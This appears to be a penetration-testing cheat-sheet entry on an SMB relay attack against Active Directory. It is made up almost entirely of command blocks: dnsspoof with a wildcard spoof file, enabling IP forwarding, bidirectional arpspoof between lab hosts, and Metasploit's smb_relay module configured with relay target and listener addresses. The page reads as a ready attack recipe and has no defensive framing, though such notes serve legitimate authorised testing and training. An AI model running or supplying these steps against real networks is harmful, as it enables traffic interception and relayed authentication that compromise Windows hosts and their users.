---
title: SMB Relay Attack
category: ad
subcategory: ad-attacks
os: linux
command: msfconsole use exploit/windows/smb/smb_relay
tools: msfconsole, dnsspoof, arpspoof
---


### Step 1 - DNS spoofing

```bash
echo "172.16.5.101 *.sportsfoo.com" > dns2
dnsspoof -i eth1 -f dns2
```

### Step 2 - Enable IP forwarding

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

### Step 3 - ARP spoofing

```bash
arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
arpspoof -i eth1 -t 172.16.5.1 172.16.5.5
```

### Step 4 - Metasploit SMB relay

```
use exploit/windows/smb/smb_relay
set SRVHOST 172.16.5.101
set LHOST 172.16.5.101
set SMBHOST 172.16.5.10
```
